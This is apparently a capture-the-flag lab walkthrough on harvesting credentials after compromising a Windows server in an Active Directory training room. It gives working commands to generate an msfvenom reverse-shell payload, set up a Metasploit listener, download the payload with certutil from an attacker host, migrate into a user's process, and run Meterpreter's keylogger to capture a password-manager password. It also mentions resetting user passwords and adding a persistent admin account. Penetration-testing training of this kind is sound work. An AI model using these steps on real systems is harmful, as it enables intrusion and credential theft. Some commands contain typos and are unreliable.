Hunting for Credentials

Now that we have compromised THMSERVER1, we should probably look around to see if there is any useful information. 
Have a look at the user directories and see if there is some useful information in any of them.

Your enumeration efforts should lead you to a .kdbx file. 
We can use Meterpreter's download command to recover this file.

This file seems to be a credential database. 
The issue, however, is that the database is encrypted with a password. We could attempt to crack the password, 
but anyone who uses a credential database usually has the savvy to make sure the initial password is secure. 
We may have more success seeing how the user interacts with this database.

SYSTEM is Sometimes Too Privileged

Meterpreter has a built-in keylogger. This will be useful for extracting the user's keystrokes. However, we can't just start this keylogger and hope for the best since our shell is currently running in the SYSTEM context. 
SYSTEM won't be typing any keystrokes, so this won't help us. To capture the correct user's credentials, we will need to ensure that our shell is running in the context of that user.

Fortunately, Meterpreter provides us with a migrate feature, and since we are running as SYSTEM, we should be able to migrate to any process. 

You have remote code execution on THMSERVER1, use this to get a Meterpreter shell. If you need a recap on using Meterpreter and Metasploit, here is a module on its use. However for a quick rundown, 




you can use the following command to generate a PowerShell meterpreter payload:
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1

You can then also use the following to create the associated listener in the msfconsole:
    sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT "listening port'; exploit"

You can host your meterpreter shell using a Python webserver and then copy it using something like this form Victim PC:
    certutil.exe -urlcache -split -f http:///shell.ps1

        Split:
            Certutil.exe may download a file from a remote destination using -urlcache. 
            This behavior does require a URL to be passed on the command-line. In addition, -f (force) and -split (Split embedded ASN.1 elements, and save to files) will be used.

    or in case of python3 web server download from:
        cerutlis -urlcache -f http:\\<ATTCK IP MACHINE>:<PORT>/<PayloadName>  <PayloadName>

Once you have a meterpreter shell, you can continue. 
The first step is to see if the users have any running processes on this machine:


Terminal
    meterpreter\>ps | grep "explorer"
    Filtering on 'explorer'

    Process List
    ============

    PID   PPID  Name          Arch  Session  User                     Path
    ---   ----  ----          ----  -------  ----                     ----
    3612  3592  explorer.exe  x64   1        THMSERVER1\trevor.local  C:\Windows\explorer.exe
Note: If you do not see an explorer.exe process for the trevor.local user, 

you can start the process yourself by performing the following steps:
    Reset the password of the trevor.local user using the following command: 
        net user trevor.local <chosen password>
    Run the following in powershell: 
        C:\auto-login.ps1 trevor.local <chosen password> THMSERVER1

Reboot the server using shutdown -r
Once the server is back online, you should see the explorer process.
It seems like we are lucky! The user has an active session on THMSERVER1. 
Let's migrate to a process of this user. The safest bet is usually sometime like explorer.exe:

Terminal
    meterpreter\>migrate 3612
        [*] Migrating from 4408 to 3612...
        [*] Migration completed successfully.
    We can confirm that we are now running in the context of our target using the getuid command:

Terminal
    meterpreter\>getuid
        Server username: THMSERVER1\trevor.local
    Now we are ready to start our keylogger:

Terminal
    meterpreter\>keyscan_start
        Starting the keystroke sniffer ...
    Now we have to be patient and wait. If we are lucky, we will capture some credentials! Give it a couple of minutes, and then run the following to dump captured keystrokes:

Terminal
    meterpreter\>keyscan_dump
        Dumping captured keystrokes...
        keep<CR>
        <Shift>Passwordpasswordpassword<CR>
    This is a straightforward example of targeting AD users. There is a lot more that can be done. It is essential to include user targeting in your exploitation methodology for AD. To answer the questions for this task you will need Keepass. 
    It has been installed on the AttackBox for you so you can just search for and run the application. If you are using your own VM, on most Linux distros sudo apt install keepassx will work. 
    Or you can download it. Also make sure to use the meterpreter download command to download the Keepass database to you host. 
    If you are using Kali, make sure that the kali user owns the database file before you open it, otherwise it might lock the database and give you incorrect results.

Although persistence will only be discussed in the next room, now might be a good time to create a local account on THMSERVER1 and grant it admin rights so you have a good foothold. 
Since this is not really needed for the rest of the tasks, if you want to do this, you will need to do a bit of research on this yourself.